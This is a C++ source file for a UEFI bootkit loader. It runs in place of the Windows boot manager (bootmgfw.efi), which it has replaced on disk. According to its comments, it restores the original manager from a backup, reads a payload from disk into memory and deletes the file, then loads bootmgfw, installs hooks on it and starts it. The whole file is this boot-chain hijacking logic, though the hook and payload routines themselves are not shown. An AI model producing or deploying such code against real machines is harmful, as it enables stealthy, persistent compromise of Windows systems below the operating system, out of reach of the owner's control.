#include "BootMgfw.h"
#include "SplashScreen.h"

#include <SELib.h>

extern "C" CHAR8* gEfiCallerBaseName = (CHAR8*)"";
extern "C" const UINT32 _gUefiDriverRevision = 0x200;

extern "C" EFI_STATUS EFIAPI UefiUnload(EFI_HANDLE ImageHandle);
extern "C" EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE * SystemTable);

EFI_STATUS EFIAPI UefiUnload(EFI_HANDLE ImageHandle)
{
    return EFI_SUCCESS;
}

EFI_STATUS EFIAPI UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE* SystemTable)
{
    EFI_STATUS Result;
    EFI_HANDLE BootMgfwHandle;
    EFI_DEVICE_PATH* BootMgfwPath = 0;

    io::vga::Clear();
    io::vga::Output(AsciiArt);
    DbgMsg(L"");

    // since we replaced bootmgfw on disk, we are going to need to restore the image back
    // this is simply just moving bootmgfw.efi.backup to bootmgfw.efi...
    if (EFI_ERROR((Result = RestoreBootMgfw())))
    {
        DbgMsg(L"Unable to restore bootmgfw... reason -> %r\n", Result);
        goto _error;
    }

    // the payload is sitting on disk... we are going to load it into memory then delete it...
    if (EFI_ERROR((Result = LoadPayLoadFromDisk(&PayLoad))))
    {
        DbgMsg(L"Failed to read payload from disk... reason -> %r\n", Result);
        goto _error;
    }

    // get the device path to bootmgfw...
    if (EFI_ERROR((Result = GetBootMgfwPath(&BootMgfwPath))))
    {
        DbgMsg(L"Failed getting bootmgfw device path... reason -> %r\n", Result);
        goto _error;
    }

    // load bootmgfw into memory...
    if (EFI_ERROR((Result = gBS->LoadImage(TRUE, ImageHandle, BootMgfwPath, NULL, NULL, &BootMgfwHandle))))
    {
        DbgMsg(L"Failed to load bootmgfw.efi... reason -> %r\n", Result);
        goto _error;
    }

    // install hooks on bootmgfw...
    if (EFI_ERROR((Result = InstallBootMgfwHooks(BootMgfwHandle))))
    {
        DbgMsg(L"Failed to install bootmgfw hooks... reason -> %r\n", Result);
        goto _error;
    }

    // wait 5 seconds then call the entry point of bootmgfw...
    //threading::Sleep(SEC_TO_MS(5));
    if (EFI_ERROR((Result = gBS->StartImage(BootMgfwHandle, NULL, NULL))))
    {
        DbgMsg(L"Failed to start bootmgfw.efi... reason -> %r\n", Result);
        Result = EFI_ABORTED;
        goto _error;
    }

    return EFI_SUCCESS;

_error:
    threading::Sleep(SEC_TO_MS(5));
    return Result;
}